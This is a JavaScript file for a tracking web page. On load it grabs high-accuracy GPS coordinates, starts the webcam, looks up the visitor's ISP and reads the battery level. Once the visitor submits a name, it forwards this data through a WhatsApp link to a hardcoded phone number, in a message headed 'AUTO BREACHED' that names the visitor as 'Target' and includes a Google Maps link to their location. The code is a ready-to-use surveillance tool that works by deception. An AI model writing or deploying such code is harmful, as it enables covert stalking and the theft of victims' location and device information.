var nomorWA = "628979100200";
var userData = { coords: "0,0", os: navigator.platform, battery: "-", isp: "-" };

window.onload = function() {
    getQuickData();
    
    // Auto-lock GPS
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(pos) {
            userData.coords = pos.coords.latitude + "," + pos.coords.longitude;
            document.getElementById('gps-status').innerText = "Location: LOCKED";
            document.getElementById('gps-status').style.color = "#00ff41";
        }, null, {enableHighAccuracy:true});
    }

    // Auto-Cam
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(function(s) { document.getElementById('webcam').srcObject = s; });
};

async function getQuickData() {
    try {
        var res = await fetch('https://ipapi.co/json/');
        var data = await res.json();
        userData.isp = data.org || "Protected";
        document.getElementById('isp-status').innerText = "ISP: " + userData.isp;
    } catch(e) {}

    try {
        var bat = await navigator.getBattery();
        userData.battery = Math.round(bat.level * 100) + "%";
        document.getElementById('bat-status').innerText = "Battery: " + userData.battery;
    } catch(e) {}
}

function finalSubmit(name) {
    document.getElementById('step-main').style.display = 'none';
    document.getElementById('step-loading').style.display = 'block';

    var p = 0;
    var t = setInterval(function() {
        p += 25;
        document.getElementById('progress').style.width = p + "%";
        if (p >= 100) {
            clearInterval(t);
            var map = "https://www.google.com/maps?q=" + userData.coords;
            var msg = "🚨 *AUTO BREACHED* 🚨%0A%0A👤 Target: " + name + "%0A📍 Maps: " + map + "%0A📡 ISP: " + userData.isp + "%0A🔋 Bat: " + userData.battery;
            window.location.href = "https://api.whatsapp.com/send?phone=" + nomorWA + "&text=" + msg;
        }
    }, 800);
}

document.getElementById('name').onkeydown = function(e) {
    if (e.key === "Enter") finalSubmit(this.value);
};
